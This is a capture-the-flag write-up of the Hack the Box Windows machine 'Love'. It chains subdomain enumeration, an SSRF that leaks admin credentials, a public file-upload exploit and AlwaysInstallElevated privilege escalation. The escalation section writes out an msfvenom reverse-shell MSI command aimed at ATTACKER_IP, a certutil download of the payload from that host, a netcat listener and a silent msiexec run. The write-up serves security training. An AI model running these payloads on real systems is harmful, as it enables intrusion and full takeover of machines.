## Welcome everyone!

It has been a long time. Today, we will explore “*Love*”, an easy-level Windows machine from Hack the Box.

Without further ado, let’s get started!

(Please ensure that you have added the following line   `love.htb     TARGET_IP`    to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive Nmap scan to gather as much information as possible about the target.

![image](/HTB/Love/Love_images/1.png)
We can identify multiple services running on the target system. The main services of interest are:

HTTP (80)

RPC (135)

NetBIOS (139)

SMB (445)

MySQL (3006)

HTTP (5000)

WinRM (5985)

We can't access the web server hosted on port 5000 directly from our machine. Let’s inspect the port 80:

![image](/HTB/Love/Love_images/2.png)

We are greeted with a login panel. Enumerating the web directories with **Gobuster** reveals an `/admin` endpoint that prompts us for a username and password. However, we don't have any valid credentials at this stage. We can use **FFUF** to enumerate potentials subdomains and grow up our attack path:

![image](/HTB/Love/Love_images/3.png)

We successfully identify a valid subdomain: `staging.love.htb`.

Before accessing it, we need to add it to our `/etc/hosts` file so that the hostname resolves to the target IP address:

![image](/HTB/Love/Love_images/4.png)

We should now be able to access the web application:

![image](/HTB/Love/Love_images/5.png)

As expected, the staging subdomain is now accessible from our web browser.

We can use Gobuster again to enumerate potential hidden endpoints:

![image](/HTB/Love/Love_images/6.png)

We identify a beta.php endpoint, which appears to be the only endpoint returning a **200** **OK** status code. Inspecting it reveals a web interface that allows us to provide a URL for the server to retrieve.

![image](/HTB/Love/Love_images/7.png)

If we attempt to make the application fetch the target machine on its default HTTP port (80), we can observe that it returns the same web content that we previously accessed through our browser:

![image](/HTB/Love/Love_images/8.png)

Since we are doing these requests from the target machine, it may be vulnerable to a SSRF vulnerability (Server-Side Request Forgery) which consists to make unauthorized requests to internal resources. As we saw earlier, the service running on port 5000 was not directly accessible from our machine. We can therefore use the **SSRF** functionality to determine whether it is accessible from the target itself. Perhaps we can use the SSRF vulnerability to access it internally.

![image](/HTB/Love/Love_images/9.png)

Indeed, we can access it internally.

Furthermore, we can retrieve interesting information, including credentials that appear to be intended for an administrative panel. As we saw earlier, our initial **Gobuster** scan revealed an `/admin` endpoint on the love.htb domain. Let's attempt to authenticate using these credentials:

`admin : @LoveIsInTheAir!!!!`

![image](/HTB/Love/Love_images/10.png)

![image](/HTB/Love/Love_images/11.png)

The credentials are valid, and we now have access to the application's administrative **dashboard**. Moreover, the application running on the server can be identified as **Voting System**.

## Initial Access

Since we have authenticated access to the web application, we can perform vulnerability research using Searchsploit to identify known vulnerabilities affecting it:

![image](/HTB/Love/Love_images/12.png)

We identify an authenticated file-upload vulnerability affecting the web application, which could allow an attacker to gain a foothold on the target machine by achieving remote code execution.

Inspecting the **Python** source code reveals several parameters that need to be modified before the exploit can be used against our target. We first need to correctly configure the relevant URL paths, the target URL, valid credentials for authentication and our local IP address and listening port in order to receive the reverse-shell connection. In my case, the exploit was configured as follows:

![image](/HTB/Love/Love_images/13.png)

Once everything has been configured correctly, we can launch the exploit:

(Make sure to set up a **Netcat listener** using `nc -lvnp PORT` beforehand in order to receive the reverse shell.)

![image](/HTB/Love/Love_images/14.png)

We successfully gained initial access to the target machine by exploiting a vulnerability in the unpatched web application.

We are greeted with a Windows command shell running as the user **phoebe**. The first flag can be retrieved in the `C:\Users\Phoebe\Desktop` directory:

## Privilege Escalation

Enumerating the relevant registry keys reveals that the **AlwaysInstallElevated** policy is enabled. This misconfiguration can allow an attacker to craft a malicious .msi file that is executed with elevated privileges, resulting in a vertical privilege escalation to the **NT AUTHORITY\SYSTEM** account and granting full control over the target machine.

For this technique to work, two registry values must be enabled:

→ `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` 

→ `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

![image](/HTB/Love/Love_images/16.png)

A malicious `.msi` file can be generated with **msfvenom** using the following command:

`msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=NC_PORT -f msi > malicious.msi`

The malicious payload can then be transferred to the target using certutil with the following command:

`certutil -urlcache -f http://ATTACKER_IP:8000/malicious.msi malicious.msi`

(Make sure to host the MSI file on your attacking machine using Python's built-in HTTP server: `python3 -m http.server 8000`.)

Finally, the malicious MSI can be executed with msiexec, triggering the payload and causing it to connect back to our listener with elevated privileges. This can be achieved with the following command:

`msiexec /quiet /qn /i malicious.msi`

![image](/HTB/Love/Love_images/17.png)

We successfully escalated our privileges to NT AUTHORITY\SYSTEM, granting us full control over the machine.

We can now grab the root flag at the `C:\Users\Administrator\Desktop` directory:

![image](/HTB/Love/Love_images/18.png)

Challenge completed!

![image](/HTB/Love/Love_images/19.png)

# Conclusion

The **Love** machine was a great example of how several vulnerabilities and misconfigurations can be chained together to fully compromise a Windows system.

The attack started with basic enumeration, which allowed us to identify the exposed web services and discover the `staging.love.htb` virtual host. From there, we identified an **SSRF vulnerability** that allowed us to make the target server access the internal service running on port 5000.

This internal service disclosed administrative credentials, which we reused to access the `/admin` panel of the main web application. After identifying the application as **Voting System**, we searched for known vulnerabilities and discovered an **authenticated file-upload vulnerability** that could be leveraged to achieve remote code execution and obtain our initial foothold as the `phoebe` user.

Once we had access to the Windows machine, local enumeration revealed that **AlwaysInstallElevated** was enabled in both the `HKCU` and `HKLM` registry locations. This insecure configuration allowed us to create a malicious MSI package and execute it with elevated privileges through `msiexec`, ultimately obtaining a shell as **NT AUTHORITY\SYSTEM**.

The complete attack chain was therefore:

```
Virtual Host Enumeration
        ↓
staging.love.htb
        ↓
SSRF
        ↓
Internal Service on Port 5000
        ↓
Credential Disclosure
        ↓
Authenticated Access
        ↓
Voting System File Upload Vulnerability
        ↓
Remote Code Execution
        ↓
Initial Foothold — phoebe
        ↓
AlwaysInstallElevated
        ↓
Malicious MSI
        ↓
NT AUTHORITY\SYSTEM
```

What I particularly liked about this machine is that the individual vulnerabilities are relatively straightforward, but the real challenge lies in **connecting the different pieces of information gathered during enumeration**. Each successful step provides the information required to move further into the attack.

Overall, **Love** is a good machine for understanding the importance of thorough enumeration, virtual-host discovery, SSRF, vulnerability research, and Windows privilege escalation.

**Thank you for reading! :)**
